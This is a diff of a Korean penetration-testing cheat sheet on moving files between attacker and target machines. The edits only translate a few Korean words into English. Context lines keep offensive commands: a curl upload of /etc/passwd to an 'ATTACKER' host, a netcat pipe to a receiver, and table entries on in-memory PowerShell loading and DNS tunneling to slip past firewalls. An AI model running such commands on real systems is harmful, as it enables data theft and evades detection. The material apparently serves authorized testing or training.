@@ -4,7 +4,7 @@
 
 ---
 
-## 공격자 → target (다운로드)
+## 공격자 → target (download)
 
 ### HTTP
 
@@ -75,7 +75,7 @@ cat file_to_send | nc RECEIVER 4444
 
 ---
 
-## target → 공격자 (업로드)
+## target → 공격자 (upload)
 
 ### HTTP Upload
 
@@ -98,13 +98,13 @@ HTTPServer(('0.0.0.0',8080), Handler).serve_forever()
 pip3 install uploadserver
 python3 -m uploadserver 8080
 
-# target에서 업로드
+# target에서 upload
 curl -F 'file=@/etc/passwd' http://ATTACKER:8080/upload
 ```
 
 ---
 
-## 인코딩 전송
+## encoding 전송
 
 ### Base64
 
@@ -157,7 +157,7 @@ Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\archive.zip
 | Linux → Linux | `scp`, `curl/wget` |
 | Linux → Windows | `impacket-smbserver`, `python http.server` |
 | Windows → Linux | `IWR`/`certutil` + HTTP, SMB |
-| 방화벽 제한 (443만 허용) | HTTPS, DNS 터널링 |
-| 바이너리 전송 불가 | Base64 인코딩 |
+| 방화벽 제한 (443만 허용) | HTTPS, DNS tunneling |
+| binary 전송 불가 | Base64 encoding |
 | 대용량 파일 | SMB, SCP |
 | 디스크에 안 남기고 싶을 때 | `IEX(...)`, PowerShell 메모리 로드 |
